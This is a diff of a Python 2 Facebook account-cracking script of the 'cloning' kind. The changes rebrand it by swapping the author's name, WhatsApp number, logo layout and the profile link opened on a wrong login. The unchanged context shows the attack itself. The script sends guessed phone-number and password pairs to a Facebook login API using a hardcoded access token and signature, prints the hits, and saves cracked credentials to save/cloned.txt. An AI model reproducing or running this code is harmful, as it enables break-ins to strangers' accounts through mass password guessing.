@@ -82,16 +82,16 @@ os.system("clear")
 print  """
 
                      
-\033[1;94mFACEBOOK  FLAME NAIM
+\033[1;94mFACEBOOK  MAHDI HASAN SHUVO
                   
-\033[1;92mWHATAAPP   017417477XX
+\033[1;92mWHATAAPP   01849108165X
 
 """
 
 ####Logo####
 
-logo1 = """#######   ##### ######    ##     ####    ######
-
+logo1 = """
+#######   ##### ######    ##     ####    ######
 ##  ##  ##  ## ##   ##   ##     ##  ##    ##
 ##  ##  ##  ## ##    ##  ##     ##   ##   ##
 ##  ######  ## ########  #########    #   ##
@@ -108,7 +108,8 @@ logo1 = """#######   ##### ######    ##     ####    ######
 ╚══──────────────────────────
 
 """
-logo2 = """######   ##### ######    ##     ####    ######
+logo2 = """
+######   ##### ######    ##     ####    ######
 ##  ##  ##  ## ##   ##   ##     ##  ##    ##
 ##  ##  ##  ## ##    ##  ##     ##   ##   ##
 ##  ######  ## ########  #########    #   ##
@@ -146,10 +147,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://www.facebook.com/Naim.Vau80')
+            os.system('xdg-open https://www.facebook.com/mahdi.80808')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.facebook.com/Naim.Vau80')
+        os.system('xdg-open https://www.facebook.com/mahdi.80808')
 
 
 numm = [5,2,5,2,2]
@@ -242,7 +243,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m(FLAME-NAIM-OK)  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;93m(MAHDI-HASAN-OK)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
